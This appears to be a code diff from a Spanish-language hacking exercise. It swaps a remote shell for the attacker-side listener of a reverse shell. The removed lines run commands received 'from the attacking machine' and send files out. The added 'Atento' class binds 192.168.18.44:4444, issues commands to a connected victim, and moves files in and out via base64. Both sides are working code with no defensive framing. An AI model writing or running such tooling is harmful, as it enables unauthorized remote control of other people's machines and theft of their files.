@@ -1,76 +1,68 @@
-from socket import socket
-from subprocess import getoutput
-from os import chdir, getcwd, path
-from time import sleep
+import socket
+import json
+import base64
 
-# Definimos la dirección y puerto, la direcion 0.0.0.0 hace referencia a que aceptamos conexiones de cualquier interfaz
-server_address = ("", 4444) #pon tu ip 
 
-# Creamos el socket (la conexión)
-server_socket = socket()
+class Atento:
+    def __init__(self, ip, port):
+        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        listener.bind((ip, port))
+        listener.listen(0)
+        print("[+] Esperando conexiones entrantes")
+        self.connection, address = listener.accept()
+        print("[+] Se ha establecido una conexión desde " + str(address))
 
-# Le pasamos la tupla donde especificamos donde escuchar
-server_socket.bind(server_address)
+    def reliable_send(self, data):
+        json_data = json.dumps(data)
+        self.connection.send(json_data.encode())
 
-# Cantidad de clientes maximos que se pueden conectar:
-server_socket.listen(1)
+    def reliable_receive(self):
+        json_data = b""
+        while True:
+            try:
+                json_data += self.connection.recv(1024)
+                return json.loads(json_data)
+            except ValueError:
+                continue
 
-# Esperamos a recibir una conexión y acceptarla:
-client_socket, client_address = server_socket.accept()
-print("esperando conexion...")
+    def execute_remotely(self, command):
+        self.reliable_send(command)
 
-estado = True
+        if command[0] == "salir":
+            self.connection.close()
+            exit()
 
-while estado:
-    # Recibimos el comando de la máquina atacante
-    comando = client_socket.recv(4096).decode()
+        return self.reliable_receive()
 
-    # Si el cliente envía "exit", cerramos la conexión y salimos del bucle
-    if comando == 'exit':
-        # Cerramos la conexión con el cliente
-        client_socket.close()
-        # Cerramos el socket servidor
-        server_socket.close()
-        estado = False
-    
-    elif comando.split(" ")[0] == 'cd':
-        # Cambiamos de directorio de trabajo
-        chdir(" ".join(comando.split(" ")[1:]))
-        client_socket.send("ruta actual: {}".format(getcwd()).encode())
-        
-    elif comando.split(" ")[0] == 'descargar':
-        # Obtenemos el nombre del archivo a descargar
-        archivo = comando.split(" ")[1]
+    def write_file(self, path, content):
+        with open(path, "wb") as file:
+            file.write(base64.b64decode(content))
+            return "[+] Descarga exitosa." 
 
-        # Verificamos si el archivo existe
-        if path.exists(archivo):
-            # Abrimos el archivo en modo lectura binaria
-            with open(archivo, "rb") as f:
-                # Leemos el contenido del archivo
-                contenido = f.read()
+    def read_file(self, path):
+        with open(path, "rb") as file:
+            return base64.b64encode(file.read()).decode()
 
-            # Enviamos el contenido del archivo al cliente
-            client_socket.send(contenido)
-        else:
-            # Enviamos un mensaje de error al cliente
-            client_socket.send("El archivo no existe".encode())
-    
-    elif comando == 'enviar':
-        # Recibimos el contenido del archivo del cliente
-        contenido = client_socket.recv(4096)
+    def run(self):
+        while True:
+            command = input("directorio>>  ")
+            command = command.split(" ")
 
-        # Escribimos el contenido del archivo en un nuevo archivo en el servidor
-        with open('archivo.txt', "wb") as f:
-            f.write(contenido)
+            try:
+                if command[0] == "enviar":
+                    file_content = self.read_file(command[1])
+                    command.append(file_content)
 
-        # Enviamos un mensaje de confirmación al cliente
-        client_socket.send("Archivo enviado correctamente".encode())
-        
-    else :
-        # Ejecutamos el comando y obtenemos su salida:
-        salida = getoutput(comando)
+                result = self.execute_remotely(command)
+                
+                if command[0] == "descargar" and "[-] Error " not in result:
+                    result = self.write_file(command[1], result)
+            except Exception:
+                result = "[-] Error durante la ejecución del comando."
 
-        # Enviamos la salida a la máquina atacante
-        client_socket.send(salida.encode())
-    
-    sleep(0.1)
+            print(result)
+
+
+my_listener = Atento("192.168.18.44", 4444)
+my_listener.run()
